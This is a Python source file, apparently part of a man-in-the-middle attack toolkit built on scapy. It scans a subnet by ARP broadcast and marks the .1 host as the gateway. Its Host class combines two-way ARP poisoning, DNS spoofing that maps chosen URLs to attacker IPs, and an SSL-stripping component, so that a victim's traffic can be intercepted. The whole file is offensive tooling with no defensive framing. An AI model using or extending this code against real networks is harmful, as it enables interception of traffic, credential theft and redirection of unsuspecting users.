from scapy.all import *

from arp_poisoning import ArpPoisoner
from dns_poisoning import DnsPoisoner
from ssl_stripping import SslRemover


class Host():

    def __init__(self, ip, mac, interface, dns_queue_num):

        self.ip           = ip
        self.mac          = mac
        self.arp_poisoner = ArpPoisoner(interface)
        self.dns_poisoner = DnsPoisoner(ip, dns_queue_num)
        self.ssl_remover  = SslRemover(ip, dns_queue_num + 1)

    def arp_oneway(self, other_ip, other_mac):

        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)

    def arp_mitm(self, other_ip, other_mac):

        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
        self.arp_poisoner.add_packet(self.mac, other_mac, self.ip, other_ip)

    def arp_start(self):

        self.arp_poisoner.start()

    def arp_stop(self):

        self.arp_poisoner.stop()

    def dns_add(self, url, ip):

        self.dns_poisoner.add_url(url, ip)

    def dns_start(self):

        self.dns_poisoner.start()

    def dns_stop(self):

        self.dns_poisoner.stop()


def get_hosts(interface, range_, timeout):

    if range_.count('.') > 4:
        range_ = range_.split('/')
        range_[1] = str(sum([str(bin(int(x))).count("1") for x in range_[1].split('.')]))
        range_ = '/'.join(range_).encode("ascii")

    gateway = None
    hosts   = []
    packet  = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range_)

    results = srp(packet, timeout=timeout, iface=interface, verbose=0)[0]
    replies = [result.answer[ARP] for result in results]

    for reply in replies:

        if reply.psrc[-2:] == ".1":
            gateway = Host(reply.psrc, reply.hwsrc, interface, 0)
        else:
            hosts.append(Host(reply.psrc, reply.hwsrc, interface, 2*(len(hosts) + 1) ))

    return gateway, hosts
